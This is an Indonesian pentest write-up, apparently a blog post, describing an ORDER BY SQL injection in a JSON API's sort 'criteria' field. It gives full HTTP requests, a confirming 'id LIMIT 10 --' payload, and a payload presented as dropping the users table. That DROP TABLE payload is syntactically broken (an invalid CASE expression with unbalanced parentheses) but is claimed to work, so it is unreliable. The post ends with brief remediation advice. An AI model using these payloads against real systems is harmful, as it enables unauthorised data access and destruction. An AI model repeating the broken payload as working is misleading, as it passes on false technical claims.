# Case unique SQL-Injection

&nbsp;
## Pembukaan
<p style="text-align: justify; letter-spacing: 0.002em;">
SQL Injection bug yang akan terus ada . Pada kali ini ijinkan saya menceritakan kasus unik saat saya melakukan Pentesting pada sebuah aplikasi, dimana pada kasus ini melibatkan kejelian melihat potensi bug yang tersembunyi, dimana tools automation seperti sqlmap tidak dapat mendeteksi kasus seperti ini dimana untuk melakukan serangan harus mampu membuat payload berupa SQL-Query yang mampu tereksekusi secara sempurna pada backend applikasi tersebut, kenapa harus bisa dieksekusi secara sempurna ??, karena pada kasus ini kita berhadapan dengan BLIND SQL-Injection.
</p>

* Untuk lebih jelasnya perhtikan raw request bodu berikut

```sh
POST /api/xxxxx HTTP/1.1
Host: target.id
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: en-US,en;q=0.5
Authorization: Bearer xxxxxxxxxx
Content-Type: application/json
Origin: https://target.id
Referer: https://target.id/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers
Content-Length: 332

{
  "dataProvider": {
    "criterion": [
      {
        "criteria": "keyword",
        "operator": "LK",
        "value": "",
        "custom": true
      }
    ],
    "page": {
      "count": 2,
      "current": 2,
      "limit": 10,
      "next": 2,
      "previous": -1,
      "total": 11
    },
    "sort": [
      {
        "criteria": "id",
        "order": "DESC"
      }
    ]
  }
}

```


<p style="text-align: justify; letter-spacing: 0.002em;">
pada request diatas terdapat request body berupa json, disaat saya menggunakan tools SQLMAP dengan command --risk=3 --level=3 dan SQLMAP melakukan pengujian (fuzzing) pada parameter (criteria,operator,limit,current,criteria,order) tidak teridentifikasi adanya bug SQLinjection
</p>

&nbsp;
## Analisa dan Debugging
<p style="text-align: justify; letter-spacing: 0.002em;">
pada saat melakukan pentesting bagian analisa dan debugging adalah bagian yang paling menantang, dimana sebagai attacker harus benar2 jeli dan mampu melihat kondisi yang ada, pada dasarnya rule of the game saat melakukan grey box adalah, apa yang kita inputkan berpengaruh pada apa yang kita dapatkan dalam kata lain, request yang kita kirim akan menentukan responses yang kita terima. Hanya dengan bermodal data itu kita di tuntut jeli dalam hal Debugging
</p>

<p style="text-align: justify; letter-spacing: 0.002em;">
Oke kita lanjut saja, pada kasus ini terdapat keanehan yang terjadi pada parameter "criteria" , dimana ketika saya merubah value pada parameter tersebut dengan unicode character atau random wording responses yang dihasilkan berupa Internal Server Error , hal ini tidak terjadi pada parameter yang lain. Berikut adalah contoh request yang mendapatkan error 500 (Internal Server Error):
</p>


```sh
POST /api/xxxxx HTTP/1.1
Host: target.id
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: en-US,en;q=0.5
Authorization: Bearer xxxxxxxxxx
Content-Type: application/json
Origin: https://target.id
Referer: https://target.id/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers
Content-Length: 332

{
  "dataProvider": {
    "criterion": [
      {
        "criteria": "keyword",
        "operator": "LK",
        "value": "",
        "custom": true
      }
    ],
    "page": {
      "count": 2,
      "current": 2,
      "limit": 10,
      "next": 2,
      "previous": -1,
      "total": 11
    },
    "sort": [
      {
        "criteria": "loloxxxooaallaoas", //attack vector
        "order": "DESC"
      }
    ]
  }
}
```

<p style="text-align: justify; letter-spacing: 0.002em;">
Pada request diatas, pada param "criteria": "loloxxxooaallaoas" dengan value random string didaptkan responses Internal Server Error, dari sini muncul sebuah hipotesa awal berupa, parameter criteria bisa di kontrol oleh user dan digunakan langsung menjadi bagian dari query pada backend.
Analisa ini kemudaian saya uji dengan menganti value :
</p>

* id -> responses 200 OK
* ids -> responses 500 Internal Server Error
* created_at -> responses 200 OK
* created_time -> responses 500 Internal Server Error


<p style="text-align: justify; letter-spacing: 0.002em;">
dari hasil pengujian analisa diatas sangat jelas sudah bahwa parameter criteria digunakan secara langsung pada backend tanpa adanya validasi terlebih dahulu. Secara logika Query yang dihasilkan pada backend kurang lebih seperti dibawah ini 
</p>

```sql
SELECT * FROM sometable ORDER BY <criteria> DESC
```

<p style="text-align: justify; letter-spacing: 0.002em;">
Pada kasus diatas ketika saya menganti paramter criteria dengan random string maka Query yang terbentuk adalah  
</p>


```sql
SELECT * FROM sometable ORDER BY loloxxxooaallaoas DESC
```

<p style="text-align: justify; letter-spacing: 0.002em;">
Nah kenapa bisa error 500 , itu menandakan columns loloxxxooaallaoas tidak ada pada table . Jelas sudah , artinya kita bisa melakukan serangan SQL Injection melalui parameter criteria.
</p>

&nbsp;
## Build Payload
<p style="text-align: justify; letter-spacing: 0.002em;">
Bagian ini adalah bagian yang paling seru karena menentukan sukses atau tidaknya sebuah serangan yang akan kita design pelurunya. Oke lanjut saja pada bagian saya mencoba melakukan analisa lanjutan denganc cara menanamkan payload yang sudah ada SQL Query didalamnya 
</p>


```sh
POST /api/xxxxx HTTP/1.1
Host: target.id
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: en-US,en;q=0.5
Authorization: Bearer xxxxxxxxxx
Content-Type: application/json
Origin: https://target.id
Referer: https://target.id/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers
Content-Length: 332

{
  "dataProvider": {
    "criterion": [
      {
        "criteria": "keyword",
        "operator": "LK",
        "value": "",
        "custom": true
      }
    ],
    "page": {
      "count": 2,
      "current": 2,
      "limit": 10,
      "next": 2,
      "previous": -1,
      "total": 11
    },
    "sort": [
      {
        "criteria": "id LIMIT 10 --", // dimasukan query LIMIT dan -- 
        "order": "DESC"
      }
    ]
  }
}
```

<p style="text-align: justify; letter-spacing: 0.002em;">
Ternyata benar dugaan saya, dengan melempar payload tersebut kita berhasil mendapatkan responses berupa API dengan object didalam array berjumlah 10 data. menurut analisa saya query yang dihasilkan berupa 
</p>


```sql
SELECT * FROM sometable ORDER BY id LIMIT 10 -- DESC
```

<p style="text-align: justify; letter-spacing: 0.002em;">
dan Booommmm !!!! dengan payload tersebut sukses untuk melakukan Query 
</p>

<p style="text-align: justify; letter-spacing: 0.002em;">
Oke langsung saja tanpa panjang lebar saya berikan design payload yang saya buat untuk menghapus table pada databases backend 
</p>

```sh
POST /api/xxxxx HTTP/1.1
Host: target.id
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Connection: close
Accept-Language: en-US,en;q=0.5
Authorization: Bearer xxxxxxxxxx
Content-Type: application/json
Origin: https://target.id
Referer: https://target.id/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers
Content-Length: 332

{
  "dataProvider": {
    "criterion": [
      {
        "criteria": "keyword",
        "operator": "LK",
        "value": "",
        "custom": true
      }
    ],
    "page": {
      "count": 2,
      "current": 2,
      "limit": 10,
      "next": 2,
      "previous": -1,
      "total": 11
    },
    "sort": [
      {
        "criteria": "id LIMIT 10 OFFSET 0+(CASE WHEN((DROP TABLE users=True) THEN 1 ELSE -1 END)--", // dimasukan query LIMIT dan -- 
        "order": "DESC"
      }
    ]
  }
}
```

maka query yang dihasilkan berupa 

```sql
SELECT * FROM sometable ORDER BY id LIMIT 10 OFFSET 0+(CASE WHEN((DROP TABLE users=True) THEN 1 ELSE -1 END) -- DESC
```

<p style="text-align: justify; letter-spacing: 0.002em;">
jika success maka table users akan terhapus, tidak hanya itu kita bisa mendesign subquery untuk melakukan serangan.
</p>

&nbsp;
## Kesimpulan

* Pentest tidak cukup hanya mengandalkan tools 
* Sebaiknya gunakan ORM atau validasi inputan dari client, sebelum memasukan menjadi bagian dari query

Thanks
